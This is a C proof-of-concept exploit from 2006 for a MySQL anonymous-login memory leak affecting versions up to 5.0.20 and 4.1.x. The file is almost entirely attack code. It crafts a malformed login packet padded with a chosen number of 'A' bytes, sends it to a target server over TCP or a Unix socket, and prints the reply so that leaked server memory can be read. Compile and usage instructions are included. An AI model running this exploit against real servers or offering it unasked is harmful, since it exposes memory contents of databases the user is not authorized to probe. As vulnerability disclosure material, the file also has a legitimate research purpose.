/* ****************************************************************
  
  April 21.st 2006
  
  my_anon_db_leak.c

  MySql Anonimous Login Memory Leak 
  
  MySql <= 5.0.20
  
  MySql <= 4.1.x
  
  copyright 2006 Stefano Di Paola (stefano.dipaola_at_wisec.it)
  
  GPL 2.0
  ****************************************************************
  
  Disclaimer:

  In no event shall the author be liable for any damages 
  whatsoever arising out of or in connection with the use 
  or spread of this information. 
  Any use of this information is at the user's own risk.
  
  ****************************************************************
  Compile with:
  gcc my_anon_db_leak.c -o my_anon_db_leak
  
  usage:
  my_anon_db_leak [-s path/to/socket] [-h hostname_or_ip] [-p port_num] [-n db_len]
  
  
*/


#include <sys/types.h>
/* we need MSG_WAITALL - that's why this ugly #ifdef, why doesn't glibc2
have MSG_WAITALL in its <socketbits.h> ??
*/

#ifdef __linux__
#include <linux/socket.h>
#else
#include <sys/socket.h>
#endif
#include <sys/socket.h>
#include <sys/un.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/file.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>		/* sockaddr_in{} and other Internet defns */
#include <netdb.h>		/* needed by gethostbyname */
#include <arpa/inet.h>		/* needed by inet_ntoa */


char anon_pckt[] = {
  0x3d, 0x00, 0x00, 0x01, 0x0d, 0xa6, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x08, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x14, 0x99, 0xdb, 0x54, 0xb6, 0x6a,
  0xd7, 0xc2, 0x86, 0x4c, 0x50, 0xa8, 0x14, 0xfe, 0x2e, 0x98, 0x27, 0x72, 0x0d, 0xad, 0x45, 0x73,
  0x00
};				// len=16*4+1=65;


int anon_pckt_len = 65;

#define USOCK "/tmp/mysql2.sock"

int
tcp_conn (char *hostname, int port)
{

  int sockfd;
  int n;
  struct sockaddr_in servaddr;

  struct hostent *hp;



  if ((hp = gethostbyname (hostname)) == 0)
    {
      perror ("gethostbyname");
      exit (0);
    }

  if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket");
      exit (1);
    }

  bzero ((char *) &servaddr, sizeof (servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons (port);

  memcpy (&servaddr.sin_addr, hp->h_addr, hp->h_length);
  if (servaddr.sin_addr.s_addr <= 0)
    {
      perror ("bad address after gethostbyname");
      exit (1);
    }
  if (connect (sockfd, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0)
    {
      perror ("connect");
      exit (1);
    }
  return sockfd;
}

int
unix_conn (char *path)
{
  int fd, len;
  struct sockaddr_un sa;

  fd = socket (PF_UNIX, SOCK_STREAM, 0);

  if (fd < 0)
    {
      perror ("cli: socket(PF_UNIX,SOCK_STREAM)");
      exit (1);
    }

  sa.sun_family = AF_UNIX;
  strcpy (sa.sun_path, path);
  len = sizeof (sa);
  if (connect (fd, (struct sockaddr *) &sa, len) < 0)
    {
      perror ("cli: connect()");
      exit (1);
    }
  return fd;
}

int
main (int argc, char *argv[])
{
  int fd;
  int i, ret;
  char packet[65535];
  char *path;
  char *host;
  int port = 3306;
  char buf[65535];
  int db_len = 0;
  int pckt_len = anon_pckt_len;
  int unix_sock = 1;
  char c;

  path = strdup (USOCK);
  host = strdup ("127.0.0.1");

  opterr = 0;

  while ((c = getopt (argc, argv, "s:h:p:n:")) != -1)
    switch (c)
      {
      case 's':
	path = strdup (optarg);
	unix_sock = 1;
	break;
      case 'h':
	host = strdup (optarg);
	unix_sock = 0;
	break;
      case 'p':
	port = atoi (optarg);
	unix_sock = 0;
	break;
      case 'n':
	db_len = atoi (optarg);
	break;

      default:
	break;
      }


  bzero (packet, 65535);

  pckt_len = anon_pckt_len + db_len;
  printf ("%d\n", pckt_len);

  for (i = 0; i < pckt_len; i++)
    packet[i] = anon_pckt[i];

  if (db_len)
    for (i = anon_pckt_len - 2; i < pckt_len; i++)
      packet[i] = 'A';

  packet[pckt_len - 1] = '\0';

  packet[0] = (char) (anon_pckt[0] + db_len) & 0xff;
  packet[1] = (char) ((anon_pckt[0] + db_len) >> 8) & 0xff;
  for (i = 0; i < pckt_len; i++)
    printf (" %.2x%c", (unsigned char) packet[i],
	    ((i + 1) % 16 ? ' ' : '\n'));
  printf ("\n");


  if (unix_sock)
    fd = unix_conn (path);
  else
    fd = tcp_conn (host, port);

  sleep (1);
  ret = recv (fd, buf, 65535, 0);
  if (send (fd, packet, pckt_len, 0) != pckt_len)
    {
      perror ("cli: send(anon_pckt)");
      exit (1);
    }

  ret = recv (fd, buf, 65535, 0);
  for (i = 0; i < ret; i++)
    printf ("%c", (isalpha (buf[i]) ? buf[i] : '.'));
  printf ("\n");
  return 0;
}
